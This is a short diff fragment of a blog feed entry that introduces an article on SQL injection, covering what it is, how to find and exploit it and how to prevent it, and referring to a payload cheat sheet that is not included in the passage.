-&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI/SQL-Injection.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;For a brief resume on all payloads to use for SQL injection testing, try the following cheat …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI/SQL-Injection.jpg"&gt;&lt;/p&gt;
 &lt;p&gt;In this section, we'll explain what SQL injection (SQLi) is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.&lt;/p&gt;
 &lt;p&gt;For a brief resume on all payloads to use for SQL injection testing, try the following cheat sheet:&lt;/p&gt;
 &lt;blockquote&gt;
